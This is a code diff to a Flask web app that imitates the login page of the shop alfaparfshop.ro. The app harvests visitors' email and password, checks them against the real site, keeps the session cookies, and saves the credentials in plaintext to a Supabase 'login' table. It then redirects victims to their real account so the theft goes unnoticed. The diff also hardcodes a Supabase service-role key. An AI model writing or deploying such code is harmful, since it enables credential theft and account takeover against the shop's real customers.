@@ -1,6 +1,6 @@
-from flask import Flask, render_template, redirect, request
-from requests import Session
-from re import findall
+from flask import Flask, render_template, redirect, request, session as flask_session
+from requests import Session, RequestException
+import re
 from supabase import create_client
 
 login_url = 'https://www.alfaparfshop.ro/inregistrare?pcId=&preview=&a=&ret=&redirect='
@@ -15,52 +15,53 @@ headers = {
     "Referer": "https://www.alfaparfshop.ro/inregistrare?pcId=&preview=&a=&ret=&redirect=",
     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
 }
-pattern = r'"name":"db369750155ef26e85b045b55c726a39","value":"(.*?)"'
+pattern = r'"name":"([0-9a-z]+)","value":"([0-9a-z]+)"'
 
 app = Flask(__name__)
-app.secret_key = 'supersecretkey'  # Necessary for session handling
+app.secret_key = 'supersecretkey' 
 
 supabase_client = create_client(
     "https://ssadrzbwbfkhtyyhwhqe.supabase.co",
     "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InNzYWRyemJ3YmZraHR5eWh3aHFlIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTcyMDU1MDU4MCwiZXhwIjoyMDM2MTI2NTgwfQ.i9Fr3Gfvif06FSCDgvME8IX4gN55Sq-KdvM93dsnz6M"
 )
 
-errorMsg = False
-
 @app.route('/')
 def index():
-    return 'Index Page'
+    url = "https://www.alfaparfshop.ro/contul-meu"
+    if 'cookies' in flask_session:
+        cookies = flask_session['cookies']
+        session = Session()
+        session.cookies.update(cookies)
+        try:
+            response = session.get(url, allow_redirects=True, headers=headers)
+            if response.url == url:
+                return redirect(url)
+        except RequestException as e:
+            print(e)
+    return redirect('/inregistrare')
 
-@app.route('/inregistrare')
+
+@app.route("/inregistrare", methods=["POST", "GET"])
 def inregistrare():
-    global errorMsg
-    return render_template('inregistrare.html', errorMsg=errorMsg)
-
-@app.route('/autentificare', methods=["POST"])
-def autentificare():
-    global errorMsg
-    email = request.form['email']
-    password = request.form['password']
-    if not login(email, password):
-        errorMsg = True
-        return redirect("/inregistrare")
     errorMsg = False
-    supabase_client.table('login').insert({'email': email, 'password': password}).execute()
-    return redirect('/') 
-
-def login(email, password):
-    client = Session()
-    response = client.get(login_url, headers=headers)
-    matches = findall(pattern, response.text)
-    if not len(matches) > 0:
-        db369750155ef26e85b045b55c726a39=""
-    else:
-        db369750155ef26e85b045b55c726a39=matches[0]
-    login_data = dict(email=email, password=password, db369750155ef26e85b045b55c726a39=db369750155ef26e85b045b55c726a39)
-    response = client.post(login_url, data=login_data, headers=headers)
-    if response.url == desired_url_after_login:
-        return True
-    return False
-
-if __name__ == '__main__':
-    app.run(debug=True)
+    if request.method == "POST":
+        email = request.form['email']
+        password = request.form['password']
+        session = Session()
+        response = session.get(login_url, headers=headers)
+        matches = re.findall(pattern, response.content.decode('utf-8'))
+        if matches:
+            hidden_input_name, hidden_input_value = matches[0]
+            login_data = {
+                "email": email,
+                "password": password,
+                hidden_input_name: hidden_input_value
+            }
+            response = session.post(login_url, data=login_data, headers=headers)
+            if response.url == desired_url_after_login:
+                flask_session['cookies'] = session.cookies.get_dict()
+                supabase_client.table('login').insert({'email': email, 'password': password}).execute()
+                return redirect(desired_url_after_login)
+        errorMsg = True
+    return render_template('inregistrare.html', errorMsg=errorMsg)
+    
